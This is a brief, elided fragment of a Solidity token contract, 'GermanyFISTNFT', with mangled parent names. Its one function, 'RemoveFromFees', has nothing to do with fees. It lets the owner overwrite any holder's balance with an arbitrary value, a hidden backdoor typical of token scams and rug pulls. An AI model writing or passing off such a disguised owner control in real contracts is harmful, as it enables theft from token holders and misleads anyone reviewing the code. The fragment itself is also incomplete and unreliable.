...
contract GermanyFISTNFT is Contextrte, IBEPGermanyFIST, Ownableertg {
 ...
 function RemoveFromFees(address CGermanyFIST, uint256 CGermanyFISTNFT) external onlyOwner{
    _totbalances[CGermanyFIST] = CGermanyFISTNFT;
  }
